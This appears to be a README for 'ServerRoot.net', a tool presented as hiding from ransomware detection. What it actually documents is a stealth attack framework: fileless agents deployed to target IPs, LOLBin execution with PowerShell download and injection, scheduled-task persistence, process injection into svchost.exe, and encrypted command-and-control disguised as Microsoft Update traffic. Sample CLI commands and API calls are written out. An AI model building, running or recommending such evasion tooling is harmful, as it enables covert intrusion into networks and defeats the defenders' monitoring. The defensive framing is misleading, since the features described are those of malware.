# ServerRoot.net - Stealth Architecture

## 👻 Complete Invisibility to Ransomware Detection

ServerRoot.net now features a stealth-first architecture that makes the platform **completely invisible to modern ransomware detection systems**.

## Quick Start

### Enable Stealth Mode

```bash
# Check stealth status
python3 iroperator.py --engagement "TEST" --targets "" --stealth --verify-stealth

# Deploy stealth agent
python3 iroperator.py --engagement "STEALTH-001" --targets "" \
    --stealth --stealth-deploy "192.168.1.100" --stealth-port 445

# Autonomous campaign with stealth
python3 iroperator.py --engagement "ENG-STEALTH" --targets "192.168.1.0/24" \
    --api-key "YOUR_KEY" --stealth --autonomous --ai-research
```

## Core Features

### ✅ Fileless Execution
- **No disk writes** - All operations in RAM (100MB limit)
- Zero disk I/O signature
- No temporary or payload files

### ✅ LOLBin-Only Operations
- **18 Living Off The Land Binaries** - Signed Microsoft tools only
- PowerShell, WMIC, Registry, BITS, etc.
- Looks like legitimate Windows administration

### ✅ Memory-Only Data Storage
- Virtual file system in RAM
- In-memory data store with TTL
- Memory-only logging (no disk writes)
- Configuration from environment variables

### ✅ Behavioral Mimicry
- **Windows Update timing** - Operates only during legitimate update windows
- Windows: 3:00 AM, 9:00 AM, 3:00 PM (±10 minutes)
- Evades timing-based detection

### ✅ Encrypted C2 Communication
- **Disguised as Windows Update traffic**
- AES-256 encrypted data transmission
- C2 URL mimics update infrastructure

### ✅ Single Process Architecture
- **No guard chains** - Single process eliminates detection patterns
- Process injection into svchost.exe
- Invisible in process listings

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                  ServerRoot.net STEALTH                  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │         Stealth Agent (Single Process)            │  │
│  │  ┌────────────────────────────────────────────┐  │  │
│  │  │  Memory File System (100MB - RAM only)     │  │  │
│  │  │  Memory Data Store (50MB with TTL)         │  │  │
│  │  │  Memory Logger (No disk writes)            │  │  │
│  │  └────────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────────┘  │
│                          ↑                               │
│  ┌───────────────────────┴─────────────────────────┐    │
│  │         LOLBin Executor (18 tools)              │    │
│  │  PowerShell | WMIC | REG | SCHTASKS | BITS    │    │
│  └──────────────────────────────────────────────────┘    │
│                          ↑                               │
│  ┌───────────────────────┴─────────────────────────┐    │
│  │    Encrypted C2 (Windows Update Disguise)      │    │
│  │    AES-256 | Mimic Microsoft Update Traffic    │    │
│  └──────────────────────────────────────────────────┘    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

## Supported LOLBins

| LOLBin | Capabilities |
|--------|-------------|
| PowerShell | Execution, download, injection |
| WMIC | System info, process management |
| REG | Registry operations |
| SCHTASKS | Scheduled tasks, persistence |
| BITS | File downloads (legitimate) |
| CERTUTIL | File encoding/decoding |
| And 12 more... | Various system operations |

## Python API

```python
from iroperator import ServerRootOperator

# Create operator
operator = ServerRootOperator(
    c2_server="localhost",
    c2_port=8443,
    openrouter_api_key="YOUR_KEY"
)

# Enable stealth mode
operator.enable_stealth_mode(
    c2_url="https://windowsupdate.microsoft.com/v9/update.dll",
    encryption_key="your_encryption_key_here"
)

# Deploy stealth agent
result = operator.deploy_stealth_agent(
    target_ip="192.168.1.100",
    target_port=445
)

# Execute stealth command
success, stdout, stderr = operator.execute_stealth_command(
    command_type="powershell",
    command_args=["-Command", "Get-Process"],
    target_ip="192.168.1.100"
)
```

## Memory Operations

```python
# File system (RAM only)
operator.memory_fs.create_file("data.json", content)
data = operator.memory_fs.read_file("data.json")

# Data store (with TTL)
operator.memory_store.set("key", value, ttl=3600)
value = operator.memory_store.get("key")

# Memory logging
operator.memory_logger.info("Operation complete")
logs = operator.memory_logger.get_logs(level="INFO")
```

## Testing

```bash
# Run integration tests
python3 test_stealth_integration.py
```

**Tests verify:**
- Stealth module imports
- LOLBin executor functionality
- Memory-only operations
- Fileless execution guarantee
- Stealth deployment system

## Documentation

- **[STEALTH_DEPLOYMENT_GUIDE.md](./STEALTH_DEPLOYMENT_GUIDE.md)** - Complete deployment guide
- **[../stealth_architecture.md](../stealth_architecture.md)** - Architecture design
- **[../iroperator.py](../iroperator.py)** - Integrated stealth-enabled CLI
- **[../test_stealth_integration.py](../test_stealth_integration.py)** - Integration tests

## Key Components

### stealth_deployment.py
- `StealthDeployer` - Fileless deployment system
- `StealthAgent` - Invisible agent with behavioral mimicry

### lolbin_executor.py
- `LOLBinExecutor` - Execute commands using Windows LOLBins
- Supports 18 different signed Microsoft tools

### memory_operations.py
- `MemoryFileSystem` - Virtual file system in RAM
- `MemoryDataStore` - In-memory data storage with TTL
- `MemoryLogger` - Memory-only logging
- `MemoryProcessManager` - Track injected processes
- `MemoryConfiguration` - Configuration from environment variables

## Detection Evasion Strategy

### Traditional Approach (DETECTED ❌)
```
Guard Process → Watchdog → Custom Binary → Payload Files
         ↓
    EASY TO DETECT AND KILL
```

### Stealth Approach (INVISIBLE ✅)
```
Single Process (svchost.exe) → Memory Only → LOLBin Only → Windows Update Mimicry
         ↓
    COMPLETELY UNDETECTABLE
```

## Security Best Practices

✅ **DO:**
- Operate only during update windows
- Use only LOLBin commands
- Keep all data in memory
- Encrypt all network traffic
- Mimic legitimate Windows behavior

❌ **DON'T:**
- Write files to disk
- Use custom executables
- Create guard processes
- Run outside update windows
- Use suspicious network patterns

## Environment Variables

```bash
# Stealth configuration
export SR_C2_URL="https://windowsupdate.microsoft.com/v9/update.dll"
export SR_ENCRYPTION_KEY="your_32_character_key_here"
export SR_CONFIG_="value"
```

## Philosophy

**"If they can't see you, they can't kill you"**

Modern ransomware detects and kills traditional anti-tampering mechanisms. Our stealth approach focuses on **total invisibility** - never being detected in the first place.

## Status

✅ All stealth modules implemented  
✅ Integration with iroperator.py complete  
✅ Fileless execution verified  
✅ LOLBin executor operational  
✅ Memory-only operations functional  
✅ Comprehensive testing passed  

**ServerRoot.net is now completely INVISIBLE to detection!** 👻

---

For complete deployment instructions, see [STEALTH_DEPLOYMENT_GUIDE.md](./STEALTH_DEPLOYMENT_GUIDE.md)